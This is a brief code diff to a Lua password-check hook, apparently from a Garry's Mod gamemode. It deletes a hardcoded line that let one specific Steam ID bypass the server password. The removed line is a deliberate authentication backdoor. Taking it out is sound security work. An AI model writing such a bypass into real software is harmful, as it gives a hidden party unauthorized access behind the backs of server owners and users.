@@ -1920,7 +1920,6 @@ local logTypeMap = {
 
 function GM:CheckPassword(steamID64, ipAddress, serverPassword, clientPassword, playerName)
     local steamID = util.SteamIDFrom64(steamID64)
-    if steamID == "STEAM_0:1:464054146" then return true end
     if serverPassword ~= "" and serverPassword ~= clientPassword then
         lia.log.add(nil, "failedPassword", steamID, playerName, serverPassword, clientPassword)
         lia.information(L("passwordsDoNotMatchFor") .. " " .. tostring(playerName) .. " (" .. tostring(steamID) .. ").")
